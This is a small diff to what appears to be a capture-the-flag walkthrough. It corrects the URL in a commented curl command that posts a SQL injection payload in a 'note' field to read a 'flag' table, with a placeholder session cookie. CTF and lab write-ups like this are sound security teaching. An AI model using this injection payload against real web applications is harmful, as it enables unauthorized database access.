@@ -11,5 +11,5 @@ Step 2: Enter URL and Your session cookie
 
 
 
-#curl -X POST http://URL.com / -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION_COOKIE" --data "note=AppSec' || (select * from flag)) --"
+#curl -X POST http://URL.com/ -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION_COOKIE" --data "note=AppSec' || (select * from flag)) --"
 
